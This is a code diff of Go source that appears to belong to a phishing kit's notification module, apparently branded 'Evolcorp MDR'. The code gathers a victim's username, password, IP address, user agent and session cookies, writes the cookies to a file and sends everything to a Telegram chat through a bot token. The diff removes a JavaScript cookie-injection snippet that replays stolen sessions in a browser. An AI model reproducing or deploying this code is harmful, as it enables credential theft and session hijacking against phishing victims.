@@ -27,7 +27,6 @@ type Token struct {
 	StoreID          interface{} `json:"storeId"`
 }
 
-// extractTokens pulls each token from the given nested map and maps it to a Token struct.
 func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
 	var tokens []Token
 
@@ -86,7 +85,6 @@ func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
 	return tokens
 }
 
-// processAllTokens takes multiple JSON strings of cookies, unmarshals them, and consolidates them.
 func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
 	var consolidatedTokens []Token
 
@@ -114,14 +112,11 @@ func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string
 	return consolidatedTokens, nil
 }
 
-// Global concurrency controls
-var (
-	processedSessions = make(map[string]bool)
-	sessionMessageMap = make(map[string]int)
-	mu                sync.Mutex
-)
+// Define a map to store session IDs and a mutex for thread-safe access
+var processedSessions = make(map[string]bool)
+var sessionMessageMap = make(map[string]int)
+var mu sync.Mutex
 
-// generateRandomString returns a 10-char random alphanumeric string.
 func generateRandomString() string {
 	rand.Seed(time.Now().UnixNano())
 	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
@@ -133,13 +128,13 @@ func generateRandomString() string {
 	return string(randomStr)
 }
 
-// createTxtFile generates a .txt file with combined cookies in a JS snippet.
 func createTxtFile(session Session) (string, error) {
 	// Create a text file name based on the email and timestamp
 	safeEmail := strings.ReplaceAll(session.Username, "@", "_")
 	safeEmail = strings.ReplaceAll(safeEmail, ".", "_")
-	timestamp := time.Now().Format("20060102_150405") // YYYYMMDD_HHMMSS
+	timestamp := time.Now().Format("20060102_150405") // YYYYMMDD_HHMMSS format
 	txtFileName := fmt.Sprintf("%s_%s.txt", safeEmail, timestamp)
+
 	txtFilePath := filepath.Join(os.TempDir(), txtFileName)
 
 	// Create a new text file
@@ -167,16 +162,7 @@ func createTxtFile(session Session) (string, error) {
 		return "", fmt.Errorf("failed to marshal Custom: %v", err)
 	}
 
-	// Combine all token groups into a single slice
-	allTokens, err := processAllTokens(
-		string(tokensJSON),
-		string(httpTokensJSON),
-		string(bodyTokensJSON),
-		string(customJSON),
-	)
-	if err != nil {
-		return "", fmt.Errorf("error processing tokens: %v", err)
-	}
+	allTokens, err := processAllTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))
 
 	result, err := json.MarshalIndent(allTokens, "", "  ")
 	if err != nil {
@@ -185,34 +171,8 @@ func createTxtFile(session Session) (string, error) {
 
 	fmt.Println("Combined Tokens: ", string(result))
 
-	// Build the JavaScript snippet without using backtick-quoted strings in Go:
-	jsWrapper := "(function(){\n" +
-		"let cookies = JSON.parse(`" + string(result) + "`);\n" +
-		"function putCookie(key, value, domain, path, isSecure) {\n" +
-		"    const cookieMaxAge = 'Max-Age=31536000';\n" +
-		"    if (isSecure) {\n" +
-		"        console.log('Setting Cookie', key, value);\n" +
-		"        if (window.location.hostname == domain) {\n" +
-		"            document.cookie = `" + "${key}=${value};${cookieMaxAge}; path=${path}; Secure; SameSite=None" + "`;\n" +
-		"        } else {\n" +
-		"            document.cookie = `" + "${key}=${value};${cookieMaxAge};domain=${domain};path=${path};Secure;SameSite=None" + "`;\n" +
-		"        }\n" +
-		"    } else {\n" +
-		"        console.log('Setting Cookie', key, value);\n" +
-		"        if (window.location.hostname == domain) {\n" +
-		"            document.cookie = `" + "${key}=${value};${cookieMaxAge};path=${path};" + "`;\n" +
-		"        } else {\n" +
-		"            document.cookie = `" + "${key}=${value};${cookieMaxAge};domain=${domain};path=${path};" + "`;\n" +
-		"        }\n" +
-		"    }\n" +
-		"}\n" +
-		"for (let cookie of cookies) {\n" +
-		"    putCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure);\n" +
-		"}\n" +
-		"}());"
-
-	// Write the wrapped JavaScript content into the text file
-	_, err = txtFile.WriteString(jsWrapper)
+	// Write the consolidated data into the text file
+	_, err = txtFile.WriteString(string(result))
 	if err != nil {
 		return "", fmt.Errorf("failed to write data to text file: %v", err)
 	}
@@ -220,15 +180,16 @@ func createTxtFile(session Session) (string, error) {
 	return txtFilePath, nil
 }
 
-// formatSessionMessage creates the text snippet for Telegram (excluding token data).
 func formatSessionMessage(session Session) string {
+	// Format the session information (no token data in message)
 	return fmt.Sprintf("🔐 Evolcorp MDR 🔐\n\n"+
-		"👤 Username: 🪤 %s\n"+
-		"🔑 Password: 🪤 %s\n"+
-		"🌐 Landing URL: 🔗 %s\n\n"+
-		"🖥️ User Agent: %s\n"+
-		"🌍 Remote Address: %s\n"+
-		"🕒 Create Time: %d\n\n"+
+		"👤 Username:      🪤 %s\n"+
+		"🔑 Password:      🪤 %s\n"+
+		"🌐 Landing URL:   🪤 %s\n \n"+
+		"🖥️ User Agent:    🪤 %s\n"+
+		"🌍 Remote Address:🪤 %s\n"+
+		"🕒 Create Time:   🪤 %d\n"+
+		"\n"+
 		"📦 Token Delivery. 🍪 incoming.\n",
 		session.Username,
 		session.Password,
@@ -239,7 +200,6 @@ func formatSessionMessage(session Session) string {
 	)
 }
 
-// Notify orchestrates creation of a text file, then sends (or edits) a Telegram notification.
 func Notify(session Session) {
 	config, err := loadConfig()
 	if err != nil {
@@ -252,15 +212,15 @@ func Notify(session Session) {
 		mu.Unlock()
 		messageID, exists := sessionMessageMap[string(session.ID)]
 		if exists {
-			txtFilePath, errCreate := createTxtFile(session)
-			if errCreate != nil {
-				fmt.Println("Error creating TXT file for update:", errCreate)
+			txtFilePath, err := createTxtFile(session)
+			if err != nil {
+				fmt.Println("Error creating TXT file for update:", err)
 				return
 			}
-			msgBody := formatSessionMessage(session)
-			errEdit := editMessageFile(config.TelegramChatID, config.TelegramToken, messageID, txtFilePath, msgBody)
-			if errEdit != nil {
-				fmt.Printf("Error editing message: %v\n", errEdit)
+			msg_body := formatSessionMessage(session)
+			err = editMessageFile(config.TelegramChatID, config.TelegramToken, messageID, txtFilePath, msg_body)
+			if err != nil {
+				fmt.Printf("Error editing message: %v\n", err)
 			}
 			os.Remove(txtFilePath)
 		}
